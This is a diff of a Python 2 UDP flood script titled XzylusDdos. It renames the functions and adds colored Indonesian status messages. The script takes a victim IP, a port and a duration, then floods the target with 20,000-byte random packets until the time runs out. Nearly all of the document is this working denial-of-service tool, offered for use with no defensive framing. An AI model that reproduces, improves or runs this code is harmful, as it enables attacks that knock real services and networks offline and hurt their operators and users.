@@ -3,12 +3,10 @@ import socket
 import random
 import sys
 
-
-def perintah():
-    print "Create by Xzylus"
-    print "Command: " "python2 XzylusDdos2.py " "<ip> <port> <packet>"
-def plut(victim, vport, duration):
-    xzylus = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+def p():
+    print "Command: python2 XzylusDdos.py <ip> <port> <packet>"
+def flood(victim, vport, duration):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes = random._urandom(20000)
     timeout =  time.time() + duration
     sent = 3000
@@ -18,15 +16,15 @@ def plut(victim, vport, duration):
             break
         else:
             pass
-        xzylus.sendto(bytes, (victim, vport))
+        client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "Memulai "%(sent, victim, vport)
+        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
-        perintah()
+        p()
     else:
-        plut(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
 
 if __name__ == '__main__':
     main()
